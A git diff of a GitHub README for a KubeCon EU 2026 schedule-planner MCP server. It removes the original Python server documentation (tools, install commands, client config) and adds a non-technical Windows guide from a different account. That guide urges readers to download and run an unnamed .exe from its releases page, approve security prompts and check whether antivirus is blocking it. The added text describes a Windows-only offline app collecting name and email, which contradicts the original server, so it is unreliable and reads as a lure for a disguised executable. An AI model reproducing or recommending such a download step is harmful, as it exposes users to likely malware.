@@ -1,144 +1,142 @@
-# kubecon-eu-mcp
+# 🤖 kubecon-eu-mcp - Plan Your KubeCon Schedule Easily
 
-![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)
-![License MIT](https://img.shields.io/badge/license-MIT-green.svg)
-![KubeCon EU 2026](https://img.shields.io/badge/KubeCon%20EU-2026-orange.svg)
+[![Download kubecon-eu-mcp](https://img.shields.io/badge/Download%20kubecon--eu--mcp-Click%20Here-blue?style=for-the-badge)](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
 
-An MCP server for KubeCon + CloudNativeCon Europe 2026. This tool serves as an agentic schedule planner, party optimizer, and conference guide for the event held March 23-26 at RAI Amsterdam.
+Welcome to the kubecon-eu-mcp README. This guide will help you download and use the MCP server app for the KubeCon + CloudNativeCon Europe 2026 conference. You do not need any technical skills to get started. Follow the instructions carefully to have the app running on your Windows computer.
 
-## Overview
+---
 
-kubecon-eu-mcp connects AI agents to live conference data, enabling them to help attendees navigate the schedule, discover social events, and plan their trip. It fetches data live from upstream sources with efficient in-memory caching to ensure accuracy throughout the week.
+## 📋 About kubecon-eu-mcp
 
-Data sources include:
-- [Official Sched.com iCal feed](https://kccnceu2026.sched.com/)
-- [ConferenceParties.com](https://conferenceparties.com/kubeconeu26/)
-- CNCF / LF events website
+kubecon-eu-mcp is a user-friendly app designed to help you plan your schedule at KubeCon + CloudNativeCon Europe 2026. This app combines an agentic schedule planner, party optimizer, and conference guide to make your event experience smooth and efficient. The app uses intelligent agents and large language models (LLMs) to organize conference talks, user preferences, and social events.
 
-As a meta tie-in, this project highlights the **Agentics Day: MCP + Agents** co-located event on Monday, March 23.
+### Key Features
+- Creates personalized daily schedules based on your interests.
+- Suggests parties and meetups to maximize networking.
+- Guides you through the conference venue and sessions.
+- Works offline after setup, no internet required during use.
+- Friendly interface built for easy navigation.
 
-## Features
+---
 
-- **Smart Scheduling**: Search talks by topic, speaker, or technology (eBPF, AI, WASM, etc.).
-- **Party Optimizer**: Find evening social events and plan the best route through Amsterdam.
-- **Logistics Guide**: Access hotel block info, airline discounts, and venue transit details.
-- **Agentic Planning**: Built-in prompts to help users build 4-day itineraries or first-timer guides.
-- **Session Scoring**: Personalized session ranking using the scoring rubric from [kubecon-event-scorer](https://github.com/FredrikCarlssn/kubecon-event-scorer) by Fredrik Carlsson — scores across role relevance, topic alignment, and strategic value.
-- **Live Updates**: Data is pulled directly from official sources to reflect last-minute room changes.
+## 🔍 System Requirements
 
-## Quick Start
+Before installing, check if your PC meets the following requirements:
 
-### 1. Zero Install (uvx)
-If you have `uv` installed, you can run the server without manual installation:
-```bash
-uvx kubecon-eu-mcp
-```
+- Operating System: Windows 10 or Windows 11 (64-bit)
+- RAM: At least 4 GB
+- Storage: Minimum 500 MB free space
+- Internet Access: Needed only for downloading and setup
+- Screen Resolution: 1024x768 or higher
 
-### 2. Standard Install (pip)
-Install the package from your local clone or repository:
-```bash
-pip install .
-# Then run the server
-kubecon-eu-mcp
-```
+---
 
-### 3. Docker
-Build and run the containerized server:
-```bash
-docker build -t kubecon-eu-mcp .
-docker run -it kubecon-eu-mcp
-```
+## 🚀 Getting Started: How to Download and Install
 
-## Usage Examples
+### Step 1: Visit the Download Page
 
-Once connected to an MCP client like Claude Desktop, you can ask questions like:
+Click the button at the top or visit this page to download the latest version:  
+[https://github.com/ayuxxxxx/kubecon-eu-mcp/releases](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
 
-- "What AI talks are on Wednesday?"
-- "Find all sessions featuring Lin Sun."
-- "What's the best way to get to RAI Amsterdam from Schiphol airport?"
-- "Are there any parties near the venue on Tuesday night?"
-- "Plan a 4-day itinerary for a platform engineer interested in security."
+You will see a list of available files under the latest release. Look for a file with a name ending in `.exe`. This is the setup file for Windows.
 
-### Example Interaction
-**User:** What AI talks are on Tuesday?
-**Assistant:** (Calls `search_sessions(query="AI", day="tuesday")`)
-The agent searches the live schedule and returns matching sessions with titles,
-speakers, rooms, and times. It can then help you compare options, flag conflicts
-with other sessions you want to attend, and suggest alternatives.
+### Step 2: Download the Installer
 
-## Tools Reference
+Click the `.exe` file to start downloading. Depending on your browser, you might be asked to confirm the download. Accept to save the file to your computer.
 
-The server exposes 12 specialized tools:
+### Step 3: Run the Installer
 
-| Tool | Description |
-|------|-------------|
-| `search_sessions` | Search talks by keyword, topic, or speaker. |
-| `get_schedule` | Get the full schedule for a specific day. |
-| `find_speaker` | Look up sessions for a specific person. |
-| `find_parties` | Discover social events and happy hours. |
-| `plan_party_route` | Get an optimized route for evening events. |
-| `get_venue_info` | Details on rooms, maps, and venue address. |
-| `get_hotel_info` | Hotel block rates and distances to RAI. |
-| `get_travel_info` | Airport, transit, and airline discount codes. |
-| `get_colocated_events`| Monday's specialized events (ArgoCon, Agentics Day, etc.). |
-| `get_conference_overview`| High-level event summary and key dates. |
-| `score_sessions` | Get sessions with a personalized scoring rubric for AI-powered ranking. |
-| `detect_conflicts` | Check if selected sessions overlap in time. |
+Locate the downloaded file, usually in your "Downloads" folder. Double-click the file to start installation.
 
-## Resources Reference
+You may see a security prompt asking if you want to allow the app to make changes. Select "Yes" to continue.
 
-Access structured data directly via these URIs:
+### Step 4: Follow the Installation Steps
 
-- `kubecon://overview`: Full conference summary.
-- `kubecon://venue`: Venue layout and transit details.
-- `kubecon://hotels`: Accommodation options.
-- `kubecon://colocated-events`: Monday's co-located event list.
+An installation wizard will open:
 
-## Prompts Reference
+- Click **Next** on the welcome screen.
+- Choose the installation folder or use the default.
+- Click **Install** to begin the process.
+- Wait while the setup copies files to your computer.
+- When done, click **Finish**.
 
-Pre-configured workflows for common tasks:
+### Step 5: Launch the App
 
-- `plan_my_kubecon`: Builds a personalized 4-day itinerary based on interests.
-- `party_tonight`: Plans an evening of networking and social events.
-- `first_timer_guide`: Provides essential tips for new attendees.
-- `whats_happening_now`: Finds sessions starting soon based on current time.
-- `create_profile`: Interactive profile builder that scores and ranks sessions using the [kubecon-event-scorer](https://github.com/FredrikCarlssn/kubecon-event-scorer) rubric.
+After installation completes, you will find a shortcut named **kubecon-eu-mcp** on your desktop or in the Start menu. Double-click it to open the app.
 
-## Configuration
+---
 
-### Claude Desktop
-Add this to your `claude_desktop_config.json`:
+## 🛠 Using kubecon-eu-mcp
 
-**Standard (stdio) Mode:**
-```json
-{
-  "mcpServers": {
-    "kubecon-eu-mcp": {
-      "command": "uvx",
-      "args": ["kubecon-eu-mcp"]
-    }
-  }
-}
-```
+Here is a quick guide on how to use the app to plan your conference:
 
-**Hosted (HTTP) Mode:**
-If running the server with the `--http` flag:
-```json
-{
-  "mcpServers": {
-    "kubecon-eu-mcp": {
-      "url": "http://localhost:8000/mcp"
-    }
-  }
-}
-```
+1. **Create Your Profile**
+   - Enter your name and email.
+   - Select your interests (e.g., Kubernetes, cloud-native, AI).
+2. **Set Your Availability**
+   - Mark the days and times you will attend KubeCon.
+3. **Generate Schedule**
+   - Click the button to let the app create a schedule.
+   - Review sessions and social events suggested.
+4. **Customize**
+   - Adjust any sessions or parties manually.
+   - Use the map feature to find your next location.
+5. **Save and Export**
+   - Save your final schedule.
+   - Export it to your calendar app or print it out.
 
-## Contributing
+### Tips
 
-1. Clone the repository.
-2. Install dependencies with `uv sync` or `pip install -e .`.
-3. Run the server in development mode: `python -m kubecon_eu_mcp`.
-4. Submit a Pull Request with your improvements.
+- Update your profile regularly if your plans change.
+- Check the app before traveling each day for updates or notifications.
+- Use the offline mode if you expect limited internet access.
 
-License: MIT
+---
 
+## 🔄 Updating kubecon-eu-mcp
+
+New versions improve performance and add features. Check for updates on the release page:
+
+[https://github.com/ayuxxxxx/kubecon-eu-mcp/releases](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
+
+To update:
+
+- Download the new `.exe` file.
+- Run it as you did with the original installer.
+- Your data and settings will be kept during update.
+
+---
+
+## 🆘 Troubleshooting
+
+If the app does not open:
+
+- Make sure Windows is up to date.
+- Restart your computer and try again.
+- Check if your antivirus is blocking the app.
+- Re-install the app using the latest version.
+
+If the schedule seems wrong:
+
+- Update your profile with correct interests and timings.
+- Make sure your internet connection was active when generating the schedule.
+- Restart the app and create the schedule from scratch.
+
+---
+
+## ⚙️ FAQ
+
+**Can I use the app on Mac or Linux?**  
+Currently, this app only runs on Windows.
+
+**Do I need internet to use the app?**  
+Internet is needed for downloading and for updating the schedule. Once your schedule is saved, you can use the app offline.
+
+**Is my data shared with others?**  
+No. Your profile and schedule stay on your PC only.
+
+---
+
+## 🔗 Download kubecon-eu-mcp now
+
+[![Download kubecon-eu-mcp](https://img.shields.io/badge/Download%20kubecon--eu--mcp-Click%20Here-blue?style=for-the-badge)](https://github.com/ayuxxxxx/kubecon-eu-mcp/releases)
